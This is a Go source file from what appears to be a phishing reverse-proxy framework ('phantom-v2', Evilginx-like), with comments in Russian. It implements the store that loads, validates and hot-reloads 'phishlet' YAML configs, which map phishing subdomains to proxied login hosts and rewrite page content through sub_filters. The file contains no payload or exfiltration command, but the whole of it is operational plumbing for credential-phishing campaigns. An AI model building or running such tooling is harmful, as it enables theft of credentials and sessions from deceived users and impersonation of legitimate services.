// Package phishlet — PhishletStore impl (specs/phishlet-v2.md).
package phishlet

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"github.com/phantom-v2/phantom/core"
	"gopkg.in/yaml.v3"
)

type Store struct {
	mu    sync.RWMutex
	byID  map[string]*core.Phishlet
	byHost map[string]*entry // "login.example.com" -> phishlet+host
}

type entry struct {
	ph *core.Phishlet
	h  *core.ProxyHost
}

func NewStore() *Store {
	return &Store{byID: map[string]*core.Phishlet{}, byHost: map[string]*entry{}}
}

func (s *Store) LoadDir(dir string) error {
	fresh, err := loadDir(dir)
	if err != nil {
		return err
	}
	s.mu.Lock()
	s.byID = fresh.byID
	s.byHost = fresh.byHost
	s.mu.Unlock()
	return nil
}

// Reload перечитывает директорию атомарно: при ошибке живой стор не тронут.
func (s *Store) Reload(dir string) error { return s.LoadDir(dir) }

// Validate экспортирует валидацию спека (генератор, API).
func Validate(p *core.Phishlet) error { return validate(p) }

// UpsertYAML парсит один YAML, валидирует и вставляет/заменяет по ID
// (старые host-ключи этого ID чистятся). Без рестарта.
func (s *Store) UpsertYAML(data []byte) (*core.Phishlet, error) {
	var p core.Phishlet
	if err := yaml.Unmarshal(data, &p); err != nil {
		return nil, err
	}
	if err := validate(&p); err != nil {
		return nil, err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	// Сначала проверяем конфликты, только потом мутируем (атомарность).
	newKeys := make([]string, 0, len(p.ProxyHosts)*len(p.BaseDomains))
	for i := range p.ProxyHosts {
		for _, d := range p.BaseDomains {
			key := strings.ToLower(p.ProxyHosts[i].PhishSub + "." + d)
			if dup, taken := s.byHost[key]; taken && dup.ph.ID != p.ID {
				return nil, fmt.Errorf("proxy host %q taken by %q", key, dup.ph.ID)
			}
			newKeys = append(newKeys, key)
		}
	}
	if old, ok := s.byID[p.ID]; ok {
		for _, h := range old.ProxyHosts {
			for _, d := range old.BaseDomains {
				delete(s.byHost, strings.ToLower(h.PhishSub+"."+d))
			}
		}
	}
	cp := p
	s.byID[p.ID] = &cp
	ki := 0
	for i := range cp.ProxyHosts {
		h := &cp.ProxyHosts[i]
		for range cp.BaseDomains {
			s.byHost[newKeys[ki]] = &entry{ph: s.byID[p.ID], h: h}
			ki++
		}
	}
	return s.byID[p.ID], nil
}

// loadDir парсит все YAML в отдельный стор (для атомарного swap).
func loadDir(dir string) (*Store, error) {
	fresh := NewStore()
	files, err := filepath.Glob(filepath.Join(dir, "*.yaml"))
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		b, err := os.ReadFile(f)
		if err != nil {
			return nil, fmt.Errorf("%s: %w", f, err)
		}
		var p core.Phishlet
		if err := yaml.Unmarshal(b, &p); err != nil {
			return nil, fmt.Errorf("%s: %w", f, err)
		}
		if err := validate(&p); err != nil {
			return nil, fmt.Errorf("%s: %w", f, err)
		}
		if _, dup := fresh.byID[p.ID]; dup {
			return nil, fmt.Errorf("%s: duplicate id %q", f, p.ID)
		}
		fresh.byID[p.ID] = &p
		for i := range p.ProxyHosts {
			h := &p.ProxyHosts[i]
			for _, d := range p.BaseDomains {
				key := strings.ToLower(h.PhishSub + "." + d)
				if _, dup := fresh.byHost[key]; dup {
					return nil, fmt.Errorf("%s: duplicate proxy host %q", f, key)
				}
				fresh.byHost[key] = &entry{ph: fresh.byID[p.ID], h: h}
			}
		}
	}
	return fresh, nil
}

func validate(p *core.Phishlet) error {
	if p.ID == "" || strings.Contains(p.ID, " ") {
		return fmt.Errorf("id required")
	}
	if p.Version != 2 {
		return fmt.Errorf("version must be 2")
	}
	if len(p.BaseDomains) == 0 || len(p.ProxyHosts) == 0 {
		return fmt.Errorf("base_domains and proxy_hosts required")
	}
	for _, f := range p.SubFilters {
		if f.Search == "" || f.Search == f.Replace {
			return fmt.Errorf("sub_filters: bad search/replace")
		}
	}
	return nil
}

func (s *Store) FindByHost(host string) (*core.Phishlet, *core.ProxyHost) {
	host = StripPort(host)
	host = strings.ToLower(host)
	s.mu.RLock()
	defer s.mu.RUnlock()
	if e, ok := s.byHost[host]; ok && e.ph.Enabled {
		return e.ph, e.h
	}
	return nil, nil
}

// StripPort корректно режет порт: hostname:port, [ipv6]:port и голый IPv6.
func StripPort(h string) string {
	h = strings.TrimSpace(h)
	if strings.HasPrefix(h, "[") {
		if host, _, err := net.SplitHostPort(h); err == nil {
			return host
		}
		return strings.Trim(h, "[]")
	}
	if host, _, err := net.SplitHostPort(h); err == nil {
		return host
	}
	// hostname:port без скобок (ровно одно двоеточие) — IPv6 без скобок не трогаем.
	if strings.Count(h, ":") == 1 {
		if i := strings.LastIndex(h, ":"); i > 0 {
			return h[:i]
		}
	}
	return h
}

func (s *Store) FindByID(id string) *core.Phishlet {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.byID[id]
}

func (s *Store) All() []*core.Phishlet {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]*core.Phishlet, 0, len(s.byID))
	for _, p := range s.byID {
		out = append(out, p)
	}
	return out
}

func (s *Store) Count() int {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return len(s.byID)
}
